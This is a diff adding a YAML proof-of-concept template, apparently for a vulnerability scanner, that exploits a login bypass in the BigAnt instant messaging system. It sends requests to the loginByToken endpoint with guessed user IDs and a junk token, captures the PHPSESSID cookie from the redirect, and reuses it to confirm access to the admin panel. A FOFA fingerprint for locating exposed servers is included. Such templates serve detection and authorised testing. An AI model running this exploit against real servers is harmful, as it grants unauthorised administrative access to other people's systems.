@@ -1,0 +1,30 @@
+id: poc-yaml-jiuqitech-bigant-ims-loginbytoken-login-bypass
+info:
+  name: 九麒科技 BigAnt 即时通讯系统 loginByToken 登录绕过漏洞
+  severity: high
+  tags:
+  - 认证绕过
+  finger: 即时通讯系统
+  fofa: body="/Public/static/admin/admin_common.js"
+variables:
+  paths: 'home/login/loginByToken?uid=1&token=asdasdasdadasadad
+
+    home/login/loginByToken?uid=2&token=asdasdasdadasadad
+
+    home/login/loginByToken?uid=3&token=asdasdasdadasadad
+
+    home/login/loginByToken?uid=4&token=asdasdasdadasadad
+
+    '
+requests:
+- method: GET
+  path: /{{.paths}}
+  expression: status_code == 302 && contains(headers,"Location\x3a /Admin/index/index")
+  output:
+  - regex_match(headers,"PHPSESSID=(?P<cookie>.*?);")
+- path: /Admin/index/index
+  headers:
+    Cookie: PHPSESSID={{.cookie}}
+  expression: status_code == 200 && contains(body,"即时通讯 系统管理") && contains(body,"修改个人信息")
+  method: GET
+transport: http
